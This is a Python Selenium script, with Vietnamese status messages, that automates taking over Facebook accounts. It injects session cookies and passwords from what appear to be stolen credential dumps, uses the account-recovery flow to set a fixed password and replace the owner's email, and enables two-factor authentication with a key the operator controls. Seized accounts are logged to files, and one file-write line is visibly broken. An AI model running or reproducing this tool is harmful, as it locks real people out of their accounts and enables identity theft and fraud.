
# import undetected_chromedriver as uc
import time
import random
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
import pickle
import requests
import json
from urllib.request import urlopen
from colored import fg, bg, attr  # pip install colored
import dload
import pathlib
import os
class FacebookSelenium:
    ref = None
    def __init__(self, index: str, folderName: str, mail: str, password: str, row: int):
        super().__init__()
        self.index = index
        self.mail = mail
        self.password = password
        self.row = row
        self.folderName = folderName
        self.old_password = None
        self.new_password = f"123@123aA"
        self.old_mail = None
        self.code = None
        options = webdriver.ChromeOptions()
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument("--disable-notifications")
        self.driver = webdriver.Chrome(options=options)
        self.driver.delete_all_cookies()
        
    def setCookieAccount(self):
        try:
            self.driver.get('https://www.facebook.com/')  
            time.sleep(1)
            accountPath = ''
            passwordPath = ''
            data = pathlib.Path(f'accounts/{self.folderName}')
            for item in data.iterdir():
                if item.is_file() and 'Facebook' in str(item):
                    fileName = str(item).replace(f"accounts\{self.folderName}\\", "")
                    accountPath = f'accounts/{self.folderName}/{fileName}'
                if item.is_file() and 'password' in str(item):
                    passwordPath = f'accounts/{self.folderName}/passwords.txt'
            accountsCookies = open(f"{accountPath}", 'r')
            if accountsCookies:
                list_cookies = accountsCookies.readlines()
                for cookie in list_cookies:
                    if '.facebook.com' in cookie:
                        cookieSplit = ' '.join(cookie.split() ).split(" ")
                        self.driver.add_cookie({
                        "domain": "facebook.com",
                        "name": cookieSplit[5],
                        "path": cookieSplit[2],
                        "sameSite": "None",
                        "value": cookieSplit[6]
                        })
                    if "Email" in cookie:
                        self.old_mail = cookie.replace('"Email": "', "").replace('",', "").replace(" ", "")
                        filePassword = open(passwordPath, 'r')
                        listPassword = filePassword.readlines()
                        index = 0
                        for password in listPassword:
                            if self.old_mail and self.old_mail in password:
                                self.old_password = listPassword[index+1].replace("Password: ", "").replace("password: ", "").replace(" ", "")
                            if len(self.old_mail) < 0:
                                if 'facebook.com' in password:
                                    self.old_password = listPassword[index+2].replace("Password: ", "").replace("password: ", "").replace(" ", "")
                            index += 1
                        print(self.old_password, self.mail)
                time.sleep(1)    
                self.driver.get('https://www.facebook.com/')  
                time.sleep(1)
                try:
                    if self.driver.find_element("id",'email') or self.driver.find_element("id", 'pass'):
                        return False
                except:
                    return True
        except:
            return False

    def get_cookies(self):
        self.driver.get('https://www.facebook.com/')
        time.sleep(1)
        return self.driver.get_cookies()
    
    def save_cookie(self):
        with open(f"data/{self.mail}/cookie_{self.mail}", 'wb') as filehandler:
            pickle.dump(self.driver.get_cookies(), filehandler)
          
    def get_main_page(self):
        self.driver.get('https://www.tiktok.com/')

    def protect_account(self):
        try:
            self.driver.get('https://www.facebook.com/hacked')
            time.sleep(3)
            protectSelect = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/div/form/div[1]/div[3]/label[2]/span")
            print('protectSelect', protectSelect)
            protectSelect.click()
            
            nextProtect1 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/div/form/div[2]/button")
            nextProtect1.click()
            
            nextProtect2 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div[1]/a")
            nextProtect2.click()
            time.sleep(20)
            print('dzo 3')
            nextProtect3 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
            nextProtect3.click()
            
            time.sleep(5)
            print('dzo 4')
            #send current password
            try: 
                if self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[1]/td[2]/input"):
                    currentPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[1]/td[2]/input")
                    print('self.old_password', self.old_password)
                    currentPassword.send_keys(self.old_password)
            except:
                pass            
            #change password
            try:
                time.sleep(3)
                print('dzo 5')
                newPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[1]/td[2]/div/input")
                print('newPassword')
                newPassword.send_keys(self.new_password)
                time.sleep(2)
                print('dzo 6')
                repeatPassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/table/tbody/tr[2]/td[2]/div/input")
                repeatPassword.send_keys(self.new_password)
                
                time.sleep(2)
                nextChangePassword = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                nextChangePassword.click()
                time.sleep(3)
            except:
                pass
            #delete old email
            oldEmail = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div[2]/div/ul/li/div/label/div/div")
            oldEmail.click()
            
            oldEmailBtn = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
            oldEmailBtn.click()
            time.sleep(3)
            
            newEmailInput = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[2]/div/div[2]/input")
            newEmailInput.send_keys(self.mail)
            
            newEmailBtn = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button[1]")
            newEmailBtn.click()
            
            #send code 
            time.sleep(20)
            codeMail = self.getEmailCode(self.mail, self.password)
            if codeMail == None:
                return False
            print(codeMail)
            codeNewMail = self.driver.find_element("name", "code")
            codeNewMail.send_keys(codeMail)
            
            approveCode = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button[1]")
            approveCode.click()
            try: 
                if self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button"):
                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                    nextProtect5.click()
                    time.sleep(1)
                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                    nextProtect5.click()
                    time.sleep(1)
                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                    nextProtect5.click()
                    time.sleep(1)
                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                    nextProtect5.click()
                    time.sleep(1)
                    nextProtect5 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                    nextProtect5.click()
            except:
                pass
            try:
                if self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button"):
                    return False
                else:
                    return True
            except:
                return True
        except:
            return False
    def get2fa(self, key: str):
        try:
            response = dload.json(f'https://2fa.live/tok/{key.replace(" ", "")}')
            print(response)
            if response:
                return response['token']
            return None            
        except:
            return None
        
    def openTwoAuthen(self):
        try:
            self.driver.get('https://www.facebook.com/security/2fac/setup/intro')
            openTwoAuthen = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div[2]/div[2]/div[2]/div[1]/div/div[2]/a")
            openTwoAuthen.click()
            time.sleep(5)
            #send password
            try:
                if self.driver.find_element("id", "ajax_password"):
                    passwordInput = self.driver.find_element("id", "ajax_password")
                    passwordInput.send_keys(self.new_password)
            except:
                pass
            try:
                acceptTwoAuthen = self.driver.find_element("xpath", "/html/body/div[5]/div[2]/div/div/div/div[3]/table/tbody/tr/td[2]/button")
                acceptTwoAuthen.click()
            except:
                pass
            time.sleep(5)
            print('dzo key')
            key =  self.driver.find_element("xpath", "/html/body/div[6]/div[2]/div/div/div/div/div/div/div[2]/div/div/div[2]/div[2]/span[2]").text
            print(key)
            self.code = self.get2fa(key)
            print('code', self.code)
            continuteCode = self.driver.find_element("xpath", "/html/body/div[6]/div[2]/div/div/div/div/div/div/div[3]/span[2]/div/div[2]/button")
            continuteCode.click()
            
            time.sleep(5)
            for i in range(1,7):
                inputCOde = self.driver.find_element("xpath", f"/html/body/div[6]/div[2]/div/div/div/div/div/div/div[2]/div/div/div/div[2]/div/div/form/input[{i}]")
                inputCOde.send_keys(self.code[i-1])
                time.sleep(1)
            
            time.sleep(5)
            
            try:
                if self.driver.find_element("xpath", '/html/body/div[6]/div[2]/div/div/div/div/div/div/div[3]/span[2]/div/div/a'):
                    return True
            except:
                return False
           
            return True
        except:
            return False
            
            
    def getEmailCode(self, newEmail, newEmailPassword):
        print('dzo get email code')
        try:
            response = dload.json(f"https://tools.dongvanfb.net/api/get_code?mail={newEmail}&pass={newEmailPassword}&type=")
            print(response)
            if response:
                return response['code']
            return None            
        except:
            return None

    def replaceEmail(self):
        try:
            self.driver.get('https://accountscenter.facebook.com/personal_info')
            time.sleep(3)
            try:
                nextReplace1 = self.driver.find_element("xpath", "/html/body/div[1]/div[2]/div[1]/div/form/div/div[3]/div[1]/button")
                nextReplace1.click()
            except:
                pass
            time.sleep(3)
            print('1')
            nextReplace2 = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[1]/div/div/div/div[1]/div[1]/div[2]/div[1]/div[2]/div/div/div/div[2]/div/main/div/div/div[3]/div/div[1]/div/div/a[1]/div[1]/div/div[1]/div/div/span[2]")
            nextReplace2.click()
            time.sleep(3)
            print('2')
            nextReplace2 = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[2]/div/div/div/div/div/div/div/div[3]/div[2]/div[4]/div/div/div[2]/div/div/div/div/div[1]/div[1]")
            nextReplace2.click()
            time.sleep(3)
            print('3')
            nextReplace2 = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[2]/div/div/div/div/div/div/div/div[3]/div[2]/div[4]/div/div/div[2]/div[2]/div/div/div/div/div[1]")
            nextReplace2.click()
            time.sleep(3)
            print('4')
            try:
                nextReplace2 = self.driver.find_element("xpath", "/html/body/div[4]/div[1]/div/div[2]/div/div/div/div[3]/div[2]/div/div/div/div[1]")
                nextReplace2.click()
            except:
                pass
            time.sleep(5)
            try:
                if self.driver.find_element("xpath", '//*[@id="facebook"]/body/div[5]/div[1]/div/div[2]/div/div/div/div/div/div/div[3]/div[2]/div[4]/div/div/div[3]/div/div'):
                    reInputPassword = self.driver.find_element("xpath", '//*[@id=":rd:"]')
                    reInputPassword.send_keys("123@123aA")
                    print('send repassword')
                    time.sleep(1)
                    clickRepassword = self.driver.find_element("xpath", '//*[@id="facebook"]/body/div[5]/div[1]/div/div[2]/div/div/div/div/div/div/div[4]/div[3]/div')
                    clickRepassword.click()
                print('click repassword')
            except:
                pass
            time.sleep(3)    
            try:
                nextReplace2 = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[3]/div[2]/div[4]/div/div/div[1]/div[2]/span[2]/div")
                nextReplace2.click()
            except:
                pass
            print('5')
            # time.sleep(3)
            # newEmail = self.driver.find_element("id", ":rd:")
            # newEmail.click()
            # newEmail.send_keys("lobelaidefx@hotmail.com")
            # time.sleep(3)
            # nextReplace2 = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[2]/div/div/div/div/div/div/div/div[4]/div[3]/div/div/div/div/div/div/div/div/div[1]")
            # nextReplace2.click()
            # time.sleep(20)
            # print('stesp nayf')
            # codeMail = self.getEmailCode('dqwdqwd@mgialc.', 'qwdqwdqw')
            # if codeMail == None:
            #     return False
            # codeNewMail = self.driver.find_element("xpath", "/html/body/div[1]/div/div[1]/div/div[3]/div/div/div[2]/div/div/div/div/div/div[2]/div/div[3]/div[2]/div[4]/div[2]/div/div/div/div/input")
            # codeNewMail.send_keys(codeMail)
        except:
            return False
    
    def run(self):
        self.ref.show.emit(self.row, 0, self.folderName)
        self.ref.show.emit(self.row, 4, "Đang change info......")
        checkLogin = self.setCookieAccount() 
        print('checkLogin', checkLogin)
        if checkLogin == True:
            self.save_cookie()
            self.ref.show.emit(self.row, 4, f"Login cookie thành công")
            changeProtected = self.protect_account()
            print('changeProtected', changeProtected)
            if changeProtected == True:
                self.ref.show.emit(self.row, 4, f"Thay đổi thông tin thành công")
                open("success.txt", 'a+').write("%s|%s|%s\n"%(self.old_mail, self.mail, self.password))
                openTwoAuthen = self.openTwoAuthen()
                print('openTwoAuthen', openTwoAuthen)
                if openTwoAuthen == True:
                    self.ref.show.emit(self.row, 4, f"Bật xác thực 2 lớp thành công")
                    if checkLogin == True and changeProtected == True and openTwoAuthen == True:
                        self.ref.checksuccess.emit(True, self.row, self.folderName, self.old_mail, self.mail, self.password)  
                    else:
                        self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)    
                    time.sleep(10)
                    os.makedirs(os.path.dirname(f"data/{self.mail}/{self.mail}.txt"), exist_ok=True)
                    open(f"data/{self.mail}/{self.mail}.txt", 'w').write("%s|%s|%s|%s|%s\n"%(self.mail, self.password, self.code, self.new_password))
                    self.save_cookie()
                if openTwoAuthen == False:
                    self.ref.show.emit(self.row, 4, f"Bật xác thực 2 lớp thất bại")
                    self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
            if changeProtected == False:
                self.ref.show.emit(self.row, 4, f"Thay đổi thông tin thất bại")
                self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
            time.sleep(3)

        if checkLogin == False:
            self.ref.show.emit(self.row, 4, f"Login cookie thất bại")
            self.ref.checksuccess.emit(False, self.row, self.folderName, self.old_mail, self.mail, self.password)  
        #protected account
        time.sleep(3)
        self.driver.quit()
        return
